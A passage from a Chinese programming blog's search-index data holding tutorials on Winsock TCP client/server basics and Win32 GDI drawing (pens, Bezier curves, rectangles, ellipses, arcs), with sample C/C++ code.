&#125; //接受链接 SOCKADDR_IN sockClient; int nLen = sizeof(sockClient); SOCKET newSocket; newSocket = accept(socketListen, NULL, NULL); //getsockname(socketListen, (struct sockaddr*)&amp;sockClient, &amp;nLen); if (INVALID_SOCKET == newSocket) &#123; printf(\"listen fail!\" ); //关闭库 closesocket(socketListen); WSACleanup(); return -1; &#125; while(g_nFlag) &#123; //判断客户端连接的集合中是否有需要接收的数据 char szRecvBuffer[5] = &#123;0&#125;; char szSendBuffer[1024]; //遍历setClient集合，如果发现setClient中的某个 int nReturnValue = recv(newSocket, szRecvBuffer, sizeof(szRecvBuffer)-1, 0); int nRes = WSAGetLastError(); if (0 == nReturnValue) &#123; //客户端正常关闭 服务端释放Socket continue ; &#125; else if (SOCKET_ERROR == nReturnValue) &#123; //网络中断 printf(\"客户端中断连接\"); continue; &#125; else &#123; //接收到客户端消息 printf(\"Client Data : %s \\n\",szRecvBuffer); //给客户回信 //scanf_s (\"%s\", szSendBuffer, 1024); //getchar(); //send(newSocket, \"repeat over\", strlen(szSendBuffer)+1, 0); &#125; &#125; //关闭socket closesocket(socketListen); closesocket(newSocket); //关闭网络库 WSACleanup(); //system(\"pause\"); return 0;&#125; 创建客户端步骤 打开网络头文件 启动网络库 校验版本 创建SOCKET 链接到服务器 与服务端收发消息 链接到服务器 链接服务器并把服务器信息与服务器socket绑定到一起 123456int WSAAPI connect( SOCKET s, //服务器socket const sockaddr *name, //服务器Ip地址端口号结构体 int namelen //参数2结构体大小); 返回值 成功 ​ 返回0 失败 ​ 返回 SOCKET_ERROR ​ WSAGetLastError()得到错误码 ​ 释放空间 ​ closesocket(socketListen); ​ WSACleanup(); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107#define _CRT_SECURE_NO_WARNINGS#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;Winsock2.h&gt;#pragma comment(lib, \"Ws2_32.lib\")int main(void)&#123; WORD wdVersion = MAKEWORD(2, 2); WSADATA wdScokMsg; int nRes = WSAStartup(wdVersion, &amp;wdScokMsg); if (0 != nRes) &#123; switch (nRes) &#123; case WSASYSNOTREADY: printf(\"重启下电脑试试，或者检查网络库\"); break; case WSAVERNOTSUPPORTED: printf(\"请更新网络库\"); break; case WSAEINPROGRESS: printf(\"请重新启动\"); break; case WSAEPROCLIM: printf(\"请尝试关掉不必要的软件，以为当前网络运行提供充足资源\"); break; &#125; return 0; &#125; //校验版本 if (2 != HIBYTE(wdScokMsg.wVersion) || 2 != LOBYTE(wdScokMsg.wVersion)) &#123; //说明版本不对 //清理网络库 WSACleanup(); return 0; &#125; //服务器socket SOCKET socketServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); if (INVALID_SOCKET == socketServer) &#123; int a = WSAGetLastError(); //清理网络库 WSACleanup(); return 0; &#125; //链接服务器 struct sockaddr_in serverMsg; serverMsg.sin_family = AF_INET; serverMsg.sin_port = htons(12345); serverMsg.sin_addr.S_un.S_addr = inet_addr(\"127.0.0.1\"); if (SOCKET_ERROR == connect(socketServer, (struct sockaddr*)&amp;serverMsg, sizeof(serverMsg))) &#123; int a = WSAGetLastError(); closesocket(socketServer); //清理网络库 WSACleanup(); return 0; &#125; while (1) &#123; char buf[1500] = &#123; 0 &#125;; //int res = recv(socketServer, buf, 50, 0); //if (0 == res) //&#123; // printf(\"链接中断、客户端下线\\n\"); //&#125; //else if (SOCKET_ERROR == res) //&#123; // //出错了 // int a = WSAGetLastError(); // //根据实际情况处理 //&#125; //else //&#123; // printf(\"%d %s\\n\", res, buf); //&#125; scanf(\"%s\", buf); if ('0' == buf[0]) &#123; break; &#125; if (SOCKET_ERROR == send(socketServer, buf, strlen(buf), 0)) &#123; //出错了 int a = WSAGetLastError(); //根据实际情况处理 printf(\"%d\\n\", a); &#125; &#125; //清理网络库 closesocket(socketServer); WSACleanup(); system(\"pause\"); return 0;&#125;","categories":[{"name":"Windows网络编程","slug":"Windows网络编程","permalink":"https://xiaowuyoucy.github.io/categories/Windows网络编程/"}],"tags":[]},{"title":"画笔","slug":"pwcp015-画笔","date":"2021-06-08T04:52:49.000Z","updated":"2021-06-08T08:07:32.586Z","comments":true,"path":"2021/06/08/pwcp015-画笔/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/08/pwcp015-画笔/","excerpt":"","text":"画笔 HPEN创建画笔句柄变量 1HPEN hPen1; CreatePen创建画笔 1HPEN CreatePen(int nPenStyle, int nWidth, COLORREF crColor); nPenStyle ------ Long，指定画笔样式，可以是下述常数之一 PS_SOLID 画笔画出的是实线 PS_DASH 画笔画出的是虚线（nWidth必须不大于1） PS_DOT 画笔画出的是点线（nWidth必须不大于1） PS_DASHDOT 画笔画出的是点划线（nWidth必须不大于1） PS_DASHDOTDOT 画笔画出的是点-点-划线（nWidth必须不大于1） PS_NULL 画笔不能画图 PS_INSIDEFRAME 由椭圆、矩形、圆角矩形、饼图以及弦等生成的封闭对象框时，画线宽度向内扩展。如指定的准确RGB颜色不存在，就进行抖动处理 nWidth --------- Long，以逻辑单位表示的画笔的宽度 crColor -------- Long，画笔的RGB颜色 [返回值] Long，如函数执行成功，就返回指向新画笔的一个句柄；否则返回零 [其它] 一旦不再需要画笔，记得用DeleteObject函数将其删除 SelectObject 该函数选择一对象到指定的设备上下文环境中，该新对象替换先前的相同类型的对象。 1HGDIOBJ SelectObject(HDC hdc, HGDIOBJ hgdiobj) 参数： hdc：设备上下文环境的句柄。 hgdiobj：被选择的对象的句柄，该指定对象必须由如下的函数创建。 位图：CreateBitmap, CreateBitmapIndirect, CreateCompatible Bitmap, CreateDIBitmap, CreateDIBsection（只有内存设备上下文环境可选择位图，并且在同一时刻只能一个设备上下文环境选择位图）。 画刷：CreateBrushIndirect, CreateDIBPatternBrush, CreateDIBPatternBrushPt, CreateHatchBrush, CreatePatternBrush, CreateSolidBrush。 字体：CreateFont, CreateFontIndirect。 笔：CreatePen, CreatePenIndirect。 区域：CombineRgn, CreateEllipticRgn, CreateEllipticRgnIndirect, CreatePolygonRgn, CreateRectRgn, CreateRectRgnIndirect。 返回值：如果选择对象不是区域并且函数执行成功，那么返回值是被取代的对象的句柄；如果选择对象是区域并且函数执行成功，返回如下一值: SIMPLEREGION：区域由单个矩形组成； COMPLEXREGION：区域由多个矩形组成; NULLREGION：区域为空。 如果发生错误并且选择对象不是一个区域，那么返回值为NULL，否则返回HGDI_ERROR。 注释：该函数返回先前指定类型的选择对象，一个应用程序在它使用新对象进行绘制完成之后，应该用原始的缺省的对象替换新对象。 应用程序不能同时选择一个位图到多个设备上下文环境中。 ICM：如果被选择的对象是画笔或笔，那么就执行颜色管理。 GetStockObject 该函数检索预定义的备用笔、刷子、字体或者调色板的句柄。 1HGDIOBJ GetStockObject(int fnObject)； fnObject：指定对象的类型，该参数可取如下值之一； BLACK_BRUSH：黑色画刷；DKGRAY_BRUSH：暗灰色画刷； DC_BRUSH：在Windows98,Windows NT 5.0和以后版本中为纯颜色画刷，缺省色为白色，可以用SetDCBrushColor函数改变颜色，更多的信息参见以下的注释部分。 GRAY_BRUSH：灰色画刷笔； HOLLOW_BRUSH：空画刷（相当于NULL_BRUSH）； NULL_BRUSH：空画刷（相当于HOLLOW_BRUSH）； LTGRAY_BRUSH：亮灰色画刷； WHITE_BRUSH：白色画刷； BLACK_PEN：黑色钢笔； DC_PEN：在Windows98、Windows NT 5.0和以后版本中为纯色钢笔，缺省色为白色，使用SetDCPenColor函数可以改变色彩，更多的信息，参见下面的注释部分。 WHITE_PEN：白色钢笔； ANSI_FIXED_FONT：在Windows中为固定间距（等宽）系统字体； ANSI_VAR_FONT：在Windows中为变间距（比例间距）系统字体； DEVICE_DEFAUCT_FONT：在WindowsNT中为设备相关字体； DEFAULT_GUI_FONT：用户界面对象缺省字体，如菜单和对话框； OEM_FIXED_FONT：原始设备制造商（OEM）相关固定间距（等宽）字体； SYSTEM_FONT：系统字体，在缺省情况下，系统使用系统字体绘制菜单，对话框控制和文本； SYSTEM_FIXED_FONT：固定间距（等宽）系统字体，该对象仅提供给兼容16位Windows版本； DEFAULT_PALETTE：缺省调色板，该调色板由系统调色板中的静态色彩组成。 返回值 如果成功，返回值标识申请的逻辑对象，如果失败，返回值为NULL。 注释 仅在CS_HREDRAW和CS_VREDRAW风格的窗口中使用DKGRAY_BRUSH、GRAY_BRUSH和LTGRAY_BRUSH对象。 如果在其他风格的窗口中使灰色画笔，可能导致在窗口移动或改变大小之后出现画笔模式错位现象，原始储存画笔不能被调整。 HOLLOW_BRUSH和NULL_BRUSH储存对象相等。 由DEFAULT_GUI_FONT储存对象使用的字体将改变。当想使用菜单、对话框和其他用户界面对象使用的字体时请使用此储存对象。 不必要通过调用DeleteObject函数来删除储存对象。 1GetStockObject(BLACK_PEN); DeleteObject删除对象句柄 1BOOL DeleteObject(HGDIOBJ hObject)； hObject：逻辑笔、画笔、字体、位图、区域或者调色板的句柄。 返回值：成功，返回非零值；如果指定的句柄无效或者它已被选入设备上下文环境，则返回值为零。 注释：当一个绘画对象（如笔或画笔）当前被选入一个设备上下文环境时不要删除该对象。当一个调色板画笔被删除时，与该画笔相关的位图并不被删除，该图必须单独地删除。 系统备用的画笔不可以DeleteObject 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228// 画笔.cpp : 定义应用程序的入口点。//#include \"stdafx.h\"#include \"画笔.h\"#define MAX_LOADSTRING 100// 全局变量: HINSTANCE hInst; // 当前实例WCHAR szTitle[MAX_LOADSTRING]; // 标题栏文本WCHAR szWindowClass[MAX_LOADSTRING]; // 主窗口类名// 此代码模块中包含的函数的前向声明: ATOM MyRegisterClass(HINSTANCE hInstance);BOOL InitInstance(HINSTANCE, int);LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);INT_PTR CALLBACK About(HWND, UINT, WPARAM, LPARAM);int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)&#123; UNREFERENCED_PARAMETER(hPrevInstance); UNREFERENCED_PARAMETER(lpCmdLine); // TODO: 在此放置代码。 // 初始化全局字符串 LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING); LoadStringW(hInstance, IDC_MY, szWindowClass, MAX_LOADSTRING); MyRegisterClass(hInstance); // 执行应用程序初始化: if (!InitInstance (hInstance, nCmdShow)) &#123; return FALSE; &#125; HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_MY)); MSG msg; // 主消息循环: while (GetMessage(&amp;msg, nullptr, 0, 0)) &#123; if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; &#125; return (int) msg.wParam;&#125;//// 函数: MyRegisterClass()//// 目的: 注册窗口类。//ATOM MyRegisterClass(HINSTANCE hInstance)&#123; WNDCLASSEXW wcex; wcex.cbSize = sizeof(WNDCLASSEX); wcex.style = CS_HREDRAW | CS_VREDRAW; wcex.lpfnWndProc = WndProc; wcex.cbClsExtra = 0; wcex.cbWndExtra = 0; wcex.hInstance = hInstance; wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_MY)); wcex.hCursor = LoadCursor(nullptr, IDC_ARROW); wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW+1); wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_MY); wcex.lpszClassName = szWindowClass; wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL)); return RegisterClassExW(&amp;wcex);&#125;//// 函数: InitInstance(HINSTANCE, int)//// 目的: 保存实例句柄并创建主窗口//// 注释: //// 在此函数中，我们在全局变量中保存实例句柄并// 创建和显示主程序窗口。//BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)&#123; hInst = hInstance; // 将实例句柄存储在全局变量中 HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); if (!hWnd) &#123; return FALSE; &#125; ShowWindow(hWnd, nCmdShow); UpdateWindow(hWnd); return TRUE;&#125;//// 函数: WndProc(HWND, UINT, WPARAM, LPARAM)//// 目的: 处理主窗口的消息。//// WM_COMMAND - 处理应用程序菜单// WM_PAINT - 绘制主窗口// WM_DESTROY - 发送退出消息并返回////LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; //创建画笔句柄变量 static HPEN hPen1, hPen2, hPen3,hOldPen; static int cxClient, cyClient; static int cyLine; switch (message) &#123; case WM_SIZE: cxClient = LOWORD(lParam); cyClient = HIWORD(lParam); cyLine = cyClient / 8; //创建画笔句柄,除了PS_SOLID可以设置宽度,其他的都不可以设置宽度 CreatePen(, 宽度 ,) hPen1 = CreatePen(PS_SOLID,1,RGB(0,0,0)); hPen2 = CreatePen(PS_DASH, 1, RGB(255, 0, 0)); hPen3 = CreatePen(PS_DOT, 1, RGB(0, 255, 0)); break; case WM_COMMAND: &#123; int wmId = LOWORD(wParam); // 分析菜单选择: switch (wmId) &#123; case IDM_ABOUT: DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About); break; case IDM_EXIT: DestroyWindow(hWnd); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; &#125; break; case WM_PAINT: &#123; PAINTSTRUCT ps; HDC hdc = BeginPaint(hWnd, &amp;ps); // TODO: 在此处添加使用 hdc 的任何绘图代码... //SelectObject 设置画笔 hOldPen = (HPEN)SelectObject(hdc, hPen1); //设置起点位置 MoveToEx(hdc,0,cyLine * 1,NULL); //从起点画到终点 LineTo(hdc,cxClient, cyLine * 1); SelectObject(hdc, hPen2); MoveToEx(hdc, 0, cyLine * 2, NULL); LineTo(hdc, cxClient, cyLine * 2); SelectObject(hdc, hPen3); MoveToEx(hdc, 0, cyLine * 3, NULL); LineTo(hdc, cxClient, cyLine * 3); SelectObject(hdc, CreatePen(PS_DASHDOT,1,RGB(20,25,255))); MoveToEx(hdc, 0, cyLine * 4, NULL); LineTo(hdc, cxClient, cyLine * 4); //DeleteObject删除旧画笔句柄 DeleteObject(SelectObject(hdc, CreatePen(PS_DASHDOTDOT, 1, RGB(20, 25, 255)))); MoveToEx(hdc, 0, cyLine * 5, NULL); LineTo(hdc, cxClient, cyLine * 5); //系统备用的画笔不可以DeleteObject //GetStockObject获取系统备用对象,获取备用画笔句柄 DeleteObject(SelectObject(hdc,GetStockObject(BLACK_PEN) )); MoveToEx(hdc, 0, cyLine * 6, NULL); LineTo(hdc, cxClient, cyLine * 6); SelectObject(hdc,hOldPen); DeleteObject(hPen1); DeleteObject(hPen2); DeleteObject(hPen3); EndPaint(hWnd, &amp;ps); &#125; break; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; return 0;&#125;// “关于”框的消息处理程序。INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)&#123; UNREFERENCED_PARAMETER(lParam); switch (message) &#123; case WM_INITDIALOG: return (INT_PTR)TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) &#123; EndDialog(hDlg, LOWORD(wParam)); return (INT_PTR)TRUE; &#125; break; &#125; return (INT_PTR)FALSE;&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"贝塞尔曲线","slug":"pwcp014-贝塞尔曲线","date":"2021-06-07T13:26:23.000Z","updated":"2021-06-08T05:11:21.800Z","comments":true,"path":"2021/06/07/pwcp014-贝塞尔曲线/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/07/pwcp014-贝塞尔曲线/","excerpt":"","text":"贝塞尔曲线 PolyBezier 1BOOL PolyBezier(HDC hdc, CONST POINT *lppt, DWORD cPoints); ● 参数 hdc：指定的设备环境句柄。 lppt：POINT结构数组的指针，包括了样条端点和控制点的坐标，其顺序是起点的坐标、起点的控制点的坐标、终点的控制点的坐标和终点的坐标。 cPoints：指明数组中的点的个数。 ● 返回值 若函数调用成功，则返回非零，否则返回零。 PolyBezierTo 12345BOOL PolyBezierTo(HDChdc,CONST POINT*lppt,DWORD cCount); hdc ------------ Long，要在其中绘图的设备场景 lppt ----------- POINTAPI，指定一个POINTAPI结构数组。其中的第一个结构指定了起点。剩下的点三个一组——包括两个控件点和一个终点. cCount---------- lppt数组的总点数 12345678//按下鼠标右键消息WM_RBUTTONDOWN://按下鼠标左键消息WM_LBUTTONDOWN://移动鼠标消息WM_MOUSEMOVE:wParam参数是按下了哪个键 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258// 贝塞尔曲线.cpp : 定义应用程序的入口点。//#include \"stdafx.h\"#include \"贝塞尔曲线.h\"#define MAX_LOADSTRING 100// 全局变量: HINSTANCE hInst; // 当前实例WCHAR szTitle[MAX_LOADSTRING]; // 标题栏文本WCHAR szWindowClass[MAX_LOADSTRING]; // 主窗口类名// 此代码模块中包含的函数的前向声明: ATOM MyRegisterClass(HINSTANCE hInstance);BOOL InitInstance(HINSTANCE, int);LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);INT_PTR CALLBACK About(HWND, UINT, WPARAM, LPARAM);int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)&#123; UNREFERENCED_PARAMETER(hPrevInstance); UNREFERENCED_PARAMETER(lpCmdLine); // TODO: 在此放置代码。 // 初始化全局字符串 LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING); LoadStringW(hInstance, IDC_MY, szWindowClass, MAX_LOADSTRING); MyRegisterClass(hInstance); // 执行应用程序初始化: if (!InitInstance (hInstance, nCmdShow)) &#123; return FALSE; &#125; HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_MY)); MSG msg; // 主消息循环: while (GetMessage(&amp;msg, nullptr, 0, 0)) &#123; if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; &#125; return (int) msg.wParam;&#125;//// 函数: MyRegisterClass()//// 目的: 注册窗口类。//ATOM MyRegisterClass(HINSTANCE hInstance)&#123; WNDCLASSEXW wcex; wcex.cbSize = sizeof(WNDCLASSEX); wcex.style = CS_HREDRAW | CS_VREDRAW; wcex.lpfnWndProc = WndProc; wcex.cbClsExtra = 0; wcex.cbWndExtra = 0; wcex.hInstance = hInstance; wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_MY)); wcex.hCursor = LoadCursor(nullptr, IDC_ARROW); wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW+1); wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_MY); wcex.lpszClassName = szWindowClass; wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL)); return RegisterClassExW(&amp;wcex);&#125;//// 函数: InitInstance(HINSTANCE, int)//// 目的: 保存实例句柄并创建主窗口//// 注释: //// 在此函数中，我们在全局变量中保存实例句柄并// 创建和显示主程序窗口。//BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)&#123; hInst = hInstance; // 将实例句柄存储在全局变量中 HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); if (!hWnd) &#123; return FALSE; &#125; ShowWindow(hWnd, nCmdShow); UpdateWindow(hWnd); return TRUE;&#125;//// 函数: WndProc(HWND, UINT, WPARAM, LPARAM)//// 目的: 处理主窗口的消息。//// WM_COMMAND - 处理应用程序菜单// WM_PAINT - 绘制主窗口// WM_DESTROY - 发送退出消息并返回////void DrawBezier(HDC hdc,POINT apt[]) &#123; PolyBezier(hdc,apt,4); MoveToEx(hdc,apt[0].x, apt[0].y,NULL); LineTo(hdc, apt[1].x, apt[1].y); MoveToEx(hdc, apt[3].x, apt[3].y, NULL); LineTo(hdc, apt[2].x, apt[2].y);&#125;void DrawBezier2(HDC hdc, POINT apt[]) &#123; MoveToEx(hdc, apt[0].x, apt[0].y, NULL); PolyBezierTo(hdc, apt + 1, 3); MoveToEx(hdc, apt[0].x, apt[0].y, NULL); LineTo(hdc, apt[1].x, apt[1].y); MoveToEx(hdc, apt[3].x, apt[3].y, NULL); LineTo(hdc, apt[2].x, apt[2].y);&#125;LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; static POINT apt[4]; HDC hdc; switch (message) &#123; case WM_RBUTTONDOWN: case WM_LBUTTONDOWN: case WM_MOUSEMOVE: if (wParam &amp; MK_RBUTTON || wParam &amp; MK_LBUTTON ) &#123; hdc = GetDC(hWnd); //用白色画笔还原 SelectObject(hdc,GetStockObject(WHITE_PEN)); DrawBezier(hdc, apt); //如果按下鼠标左键 if (wParam &amp; MK_LBUTTON) &#123; apt[1].x = LOWORD(lParam); apt[1].y = HIWORD(lParam); &#125; //如果按下鼠标右键 if (wParam &amp; MK_RBUTTON) &#123; apt[2].x = LOWORD(lParam); apt[2].y = HIWORD(lParam); &#125; //用黑色画笔画 SelectObject(hdc, GetStockObject(BLACK_PEN)); DrawBezier(hdc, apt); //DrawBezier2(hdc, apt); ReleaseDC(hWnd,hdc); &#125; break; case WM_SIZE: //设置起点,起点控点,终点控点,终点 apt[0].x = LOWORD(lParam) / 5; apt[0].y = HIWORD(lParam)/2; apt[1].x = 0; apt[1].y = 0; apt[2].x = LOWORD(lParam) * 4 / 5; apt[2].y = HIWORD(lParam)/2 - 200; apt[3].x = LOWORD(lParam) * 4/ 5; apt[3].y = HIWORD(lParam)/2; break; case WM_COMMAND: &#123; int wmId = LOWORD(wParam); // 分析菜单选择: switch (wmId) &#123; case IDM_ABOUT: DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About); break; case IDM_EXIT: DestroyWindow(hWnd); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; &#125; break; case WM_PAINT: &#123; PAINTSTRUCT ps; HDC hdc = BeginPaint(hWnd, &amp;ps); // TODO: 在此处添加使用 hdc 的任何绘图代码... DrawBezier(hdc,apt); EndPaint(hWnd, &amp;ps); &#125; break; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; return 0;&#125;// “关于”框的消息处理程序。INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)&#123; UNREFERENCED_PARAMETER(lParam); switch (message) &#123; case WM_INITDIALOG: return (INT_PTR)TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) &#123; EndDialog(hDlg, LOWORD(wParam)); return (INT_PTR)TRUE; &#125; break; &#125; return (INT_PTR)FALSE;&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"边框绘制函数","slug":"pwcp013-边框绘制函数","date":"2021-06-07T12:08:10.000Z","updated":"2021-06-07T13:06:27.013Z","comments":true,"path":"2021/06/07/pwcp013-边框绘制函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/07/pwcp013-边框绘制函数/","excerpt":"","text":"边框绘制函数 Rectangle矩形 使用该函数画一个矩形，可以用当前的画笔画矩形轮廓，用当前画刷进行填充。 1BOOL Rectangle(HDC hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect)； hdc：设备环境句柄。 nLeftRect：指定矩形左上角的逻辑X坐标。 nTopRect：指定矩形左上角的逻辑Y坐标。 nRightRect：指定矩形右下角的逻辑X坐标。 nBottomRect：指定矩形右下角的逻辑Y坐标。 返回值：如果函数调用成功，返回值非零，否则返回值为0。 Windows NT：若想获得更多错误信息，请调用GetLastError函数。 备注：此函数不使用和改变当前位置。 1Rectangle(hdc,200,50,600,400); Ellipse画圆或椭圆 123456BOOL Ellipse(HDC hdc,int nLeftRect,int nTopRect,int nRightRect,int nBottomRect)； hdc：设备环境句柄。 nLeftRect：指定限定矩形左上角的X坐标。 nTopRect：指定限定矩形左上角的Y坐标。 nRightRect：指定限定矩形右下角的X坐标。 nBottomRect：指定限定矩形右下角的Y坐标。 如果函数调用成功，返回值非零；如果函数调用失败，返回值是0。 Windows NT：若想获得更多错误信息，请调用GetLastError函数。 1Ellipse(hdc, 200, 50, 600, 400); RoundRect带圆角的矩形 该函数画一个带圆角的矩形，此矩形由当前画笔画轮廓，由当前画刷填充。 1BOOL RoundRect(HDC hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nWidth, int nHeight)； 参数： hdc：设备环境句柄。 nLeftRect：指定矩形左上角的X坐标。 nTopRect：指定矩形左上角的Y坐标。 nRightRect：指定矩形右下角的X坐标。 nbottomRect：指定矩形右下角的Y坐标。 nWidth：指定用来画圆角的椭圆的宽。 nHeight：指定用来画圆角的椭圆的高。 返回值：如果函数调用成功，则返回值非空，否则返回值是0。 Windows NT：若想获得更多的错误信息，请调用GetLastError函数。 1RoundRect(hdc, 700, 50, 1100, 400,100,100); ARC画圆弧 12345678910BOOL Arc(HDC hdc,int xLeft,int yTop,int xRight,int yBottom,int XStart,int YStart,int XEnd,int YEnd); hdc 绘画的窗口句柄 xLeft和nyTopt指定外接矩形左上角坐标 xRight和yBottom指定外接矩形右下角坐标 xStart和yStart指定圆弧开始坐标 xEnd和nyEnd指定圆弧结束坐标 1Arc(hdc, 850, 500, 1000, 650, 20, 600, 1200, 400); Chord画弦 1234BOOL Chord( DC: HDC; &#123;设备环境句柄&#125; int X1, Y1, X2, Y2, X3, Y3, X4, Y4 ; &#123;四个坐标点&#125;); 参数表 X1,Y1 ---------- Long，指定围绕椭圆的一个矩形的左上角位置 X2,Y2 ---------- Long，指定围绕椭圆的一个矩形的右下角位置 X3,Y3 ---------- Long，指定与椭圆相交的一条线的一个点 X4,Y4 ---------- Long，指定与椭圆相交的一条线的另一个点 返回值 Long，非零表示成功，零表示失败。会设置GetLastError 1Chord(hdc, 450,500,800,850, 20, 600, 1200, 400); Pie画圆饼 1BOOL Pie(HDC hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nXRadial1, int nYRadial1, int nXRadial2, int nYRadial2)； hdc：设备环境句柄。 nLeftRect：指定限定矩形左上角的X坐标。 nTopRect：指定限定矩形左上角的Y坐标。 nRigthRect：指定限定矩形右下角的X坐标。 nBottomRect：指定限定矩形右下角的Y坐标。 nXRadial1：指定第一条半径的端点的X坐标。 nYRadial1：指定第一条半径的端点的Y坐标。 nXRadial2：指定第二条半径的端点的X坐标。 nYRadial2：指定第二条半径的端点的Y坐标。 返回值：如果函数调用成功，返回值非零；如果函数调用失败，返回值是0。 Windows：要得到更多的错误信息，调用GetLastError。 1Pie(hdc,50,500,400,850,500,0,50,650); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193// 边框绘制函数.cpp : 定义应用程序的入口点。//#include \"stdafx.h\"#include \"边框绘制函数.h\"#define MAX_LOADSTRING 100// 全局变量: HINSTANCE hInst; // 当前实例WCHAR szTitle[MAX_LOADSTRING]; // 标题栏文本WCHAR szWindowClass[MAX_LOADSTRING]; // 主窗口类名// 此代码模块中包含的函数的前向声明: ATOM MyRegisterClass(HINSTANCE hInstance);BOOL InitInstance(HINSTANCE, int);LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);INT_PTR CALLBACK About(HWND, UINT, WPARAM, LPARAM);int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)&#123; UNREFERENCED_PARAMETER(hPrevInstance); UNREFERENCED_PARAMETER(lpCmdLine); // TODO: 在此放置代码。 // 初始化全局字符串 LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING); LoadStringW(hInstance, IDC_MY, szWindowClass, MAX_LOADSTRING); MyRegisterClass(hInstance); // 执行应用程序初始化: if (!InitInstance (hInstance, nCmdShow)) &#123; return FALSE; &#125; HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_MY)); MSG msg; // 主消息循环: while (GetMessage(&amp;msg, nullptr, 0, 0)) &#123; if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); 